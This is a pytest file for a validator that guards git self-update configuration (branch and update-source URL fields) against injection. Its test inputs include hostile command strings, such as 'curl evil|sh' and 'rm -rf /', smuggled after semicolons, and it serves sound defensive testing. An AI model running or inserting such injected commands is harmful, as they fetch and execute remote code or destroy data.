"""POST /setup/config charset allowlist for the hub self-update git argv.

The fields that flow into the hub self-update git command (update_sources.* URLs
+ global_branch) must be charset-validated at config-write time so an admin
config write can never repoint the hub at an attacker repo or a weird ref. The
hub's ``_git_update`` no longer uses a shell (create_subprocess_exec), but the
validator is the primary guard; these tests pin it.
"""

import sys, os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src", "routes"))

from setup_misc import _validate_update_config, _ConfigValidationError  # noqa: E402

import pytest  # noqa: E402


def _expect_ok(config):
    _validate_update_config(config)  # must not raise


def _expect_bad(config, needle):
    with pytest.raises(_ConfigValidationError) as ei:
        _validate_update_config(config)
    assert needle in str(ei.value), str(ei.value)


def test_branch_rejects_shell_metachar():
    _expect_bad({"global_branch": "main; curl evil|sh #"}, "global_branch")


def test_branch_accepts_typical_refs():
    for b in ("main", "develop", "release/1.2", "feature/foo-bar_v2"):
        _expect_ok({"global_branch": b})


def test_hub_url_rejects_space_and_shell():
    _expect_bad({"update_sources": {"hub": "https://evil.ex/x; rm -rf /"}},
                "update_sources.hub")


def test_hub_url_accepts_https_git():
    _expect_ok({"update_sources": {"hub": "https://github.com/lbockenstedt/lm.git"}})


def test_empty_hub_is_allowed():
    # explicit "" = "use default / unset" must not be rejected (the LOUD
    # fallback path depends on empty being a legal value).
    _expect_ok({"update_sources": {"hub": ""}})
    _expect_ok({"update_sources": {"hub": None}})


def test_all_url_source_keys_validated():
    bad = {k: "https://evil.ex/x; sh -c x" for k in
           ("hub", "pxmx", "opnsense", "cs", "cppm", "netbox", "ldap", "nw", "le", "agent")}
    _expect_bad({"update_sources": bad}, "update_sources.")


def test_non_url_source_key_charset_bounded():
    # a non-URL source key with a shell metachar is still rejected (charset bound)
    _expect_bad({"update_sources": {"weird": "abc; def"}}, "update_sources.weird")


def test_non_dict_config_is_noop():
    _validate_update_config(None)  # must not raise
    _validate_update_config("not a dict")


def test_non_dict_sources_is_noop():
    _validate_update_config({"update_sources": "not a dict"})  # other handler rejects